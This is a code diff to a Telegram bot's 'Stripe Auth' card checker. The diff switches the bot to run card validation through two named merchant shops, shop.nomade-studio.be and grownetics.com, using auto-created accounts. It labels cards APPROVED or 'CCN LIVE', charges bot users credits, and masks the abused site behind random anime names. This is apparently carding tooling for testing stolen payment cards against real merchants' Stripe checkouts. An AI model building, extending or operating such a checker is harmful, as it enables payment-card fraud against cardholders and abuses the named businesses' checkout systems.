@@ -3,10 +3,12 @@ Stripe Auth Single Card Checker
 ===============================
 Handles /au command for Stripe authentication checks.
 
-Uses WooCommerce site (epicalarc.com) with auto-registration for Stripe auth checks.
+Uses shop.nomade-studio.be (primary) or grownetics.com (secondary) with auto-registration.
+Each check creates a new account for maximum speed and reliability.
 """
 
 import re
+import random
 from time import time
 from datetime import datetime
 import asyncio
@@ -15,14 +17,27 @@ from pyrogram import Client, filters
 from pyrogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ParseMode
 
+# Anime character names for gateway display (professional)
+ANIME_CHARACTERS = [
+    "Naruto Uzumaki", "Sasuke Uchiha", "Goku", "Luffy", "Ichigo Kurosaki",
+    "Eren Yeager", "Levi Ackerman", "Tanjiro Kamado", "Zenitsu Agatsuma",
+    "Gojo Satoru", "Yuji Itadori", "Megumi Fushiguro", "Kakashi Hatake",
+    "Itachi Uchiha", "Monkey D. Luffy", "Roronoa Zoro", "Sanji Vinsmoke",
+    "Light Yagami", "L Lawliet", "Edward Elric", "Alphonse Elric",
+    "Spike Spiegel", "Vash the Stampede", "Guts", "Griffith",
+    "Kenshin Himura", "Saitama", "Genos", "Mob", "Reigen Arataka",
+    "Deku", "Katsuki Bakugo", "Shoto Todoroki", "All Might",
+    "Levi", "Mikasa Ackerman", "Armin Arlert", "Erwin Smith"
+]
+
 from BOT.helper.start import load_users
 from BOT.helper.permissions import check_private_access, is_premium_user
 from BOT.helper.antispam import can_run_command
 from BOT.gc.credit import deduct_credit, has_credits
 
-# Import the WooCommerce Stripe checker and gate selector
-from BOT.Auth.StripeAuth.wc_checker import check_stripe_wc_fullcc, determine_status
+# Import the Nomade and Grownetics checkers
 from BOT.Auth.StripeAuth.nomade_checker import check_nomade_stripe, determine_nomade_status
+from BOT.Auth.StripeAuth.grownetics_checker import check_grownetics_stripe, determine_grownetics_status
 from BOT.Auth.StripeAuth.au_gate import (
     get_au_gate,
     get_au_gate_url,
@@ -57,12 +72,14 @@ def format_response(fullcc: str, result: dict, user_info: dict, time_taken: floa
     message = result.get("message", "Unknown")
     site = result.get("site", "Unknown")
     
-    # Determine status and header (support both checkers)
+    # Determine status and header (support all checkers)
     site = result.get("site", "")
     if "nomade" in site.lower():
         status = determine_nomade_status(result)
+    elif "grownetics" in site.lower():
+        status = determine_grownetics_status(result)
     else:
-        status = determine_status(result)
+        status = determine_nomade_status(result)  # Default to nomade status
     
     if status == "APPROVED":
         header = "APPROVED"
@@ -101,16 +118,13 @@ def format_response(fullcc: str, result: dict, user_info: dict, time_taken: floa
         country = "N/A"
         country_flag = "🏳️"
     
-    # Site display
-    if site and site != "Unknown":
-        site_display = site.replace("https://", "").replace("http://", "")[:25]
-    else:
-        site_display = "WC Stripe"
+    # Use random anime character name instead of site name (professional)
+    anime_name = random.choice(ANIME_CHARACTERS)
     
     return f"""<b>[#StripeAuth] | {header}</b> ✦
 ━━━━━━━━━━━━━━━
 <b>[•] Card:</b> <code>{fullcc}</code>
-<b>[•] Gateway:</b> <code>Stripe Auth [{site_display}]</code>
+<b>[•] Gateway:</b> <code>Stripe Auth [{anime_name}]</code>
 <b>[•] Status:</b> <code>{status_text}</code>
 <b>[•] Response:</b> <code>{message_display}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
@@ -253,9 +267,19 @@ async def handle_au_command(client: Client, message: Message):
                 result["response"] = "CCN LIVE"
             else:
                 result["response"] = result.get("response", "DECLINED")
+        elif gate_key == "grownetics":
+            # Use fast Grownetics checker
+            result = await check_grownetics_stripe(fullcc)
+            # Convert grownetics result format to match expected format
+            if result.get("response") == "APPROVED":
+                result["response"] = "APPROVED"
+            elif result.get("response") == "CCN LIVE" or result.get("response") == "CCN_LIVE":
+                result["response"] = "CCN LIVE"
+            else:
+                result["response"] = result.get("response", "DECLINED")
         else:
-            # Use WooCommerce checker for epicalarc
-            result = await check_stripe_wc_fullcc(fullcc, site_url=site_url)
+            # Fallback to nomade if unknown gate
+            result = await check_nomade_stripe(fullcc)
 
         time_taken = round(time() - start_time, 2)
 
@@ -301,7 +325,7 @@ async def handle_au_command(client: Client, message: Message):
 
 @Client.on_callback_query(filters.regex("^au_change_gate$"))
 async def au_change_gate_callback(client: Client, cq: CallbackQuery):
-    """Toggle Stripe Auth gate (nomade <-> epicalarc) for /au and /mau."""
+    """Toggle Stripe Auth gate (nomade <-> grownetics) for /au and /mau."""
     if not cq.from_user:
         return
     user_id = str(cq.from_user.id)
@@ -314,7 +338,7 @@ async def au_change_gate_callback(client: Client, cq: CallbackQuery):
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>• Current gate:</b> <code>{label}</code>
 <b>• Primary:</b> <code>nomade-studio.be</code> (Fast ⚡)
-<b>• Secondary:</b> <code>epicalarc.com</code>
+<b>• Secondary:</b> <code>grownetics.com</code>
 <b>• Use</b> <code>/au</code> <b>or</b> <code>/mau</code> <b>to check.</b>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━""",
             reply_markup=InlineKeyboardMarkup([
